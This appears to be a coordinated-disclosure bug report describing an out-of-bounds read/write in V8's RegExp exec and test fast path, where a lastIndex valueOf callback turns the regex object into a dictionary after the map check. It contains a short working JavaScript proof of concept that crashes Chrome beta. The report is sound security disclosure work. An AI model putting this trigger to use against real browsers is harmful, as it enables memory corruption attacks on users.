There is an out-of-bounds access in RegExp.prototype.exec and RegExp.prototype.test. The code defined in BranchIfFastRegExp checks whether a regular expression object has the default map, however, it is possible to alter the map after this check has been performed. This can cause inline fields, such as lastIndex to be changed to dictionary properties. This will cause out-of-bounds reads and writes the next time lastIndex is accessed on the fast path.

A minimal PoC is as follows, and two full PoCs (one for test and one for exec) are attached.

var re;
function f(){
	for(var i = 0; i < 100; i++){
		re["test" + i] = 0x77777777; // make a dict
	}
return 0;
}

re = /-/g;
var str = '2016-01-02';
re.lastIndex = {valueOf : f};
result = re.exec(str);

This PoC crashes on google-chrome-beta on Linux.

Please note there are several situations in the RegExp class where user script can change the map during the fast path (for example, in  replace and split), but it wasn't obvious how to cause a crash. I recommend cleaning up this code so that the slow path is taken whenever user script is executed.

This bug is subject to a 90 day disclosure deadline. After 90 days elapse
or a patch has been made broadly available, the bug report will become
visible to the public.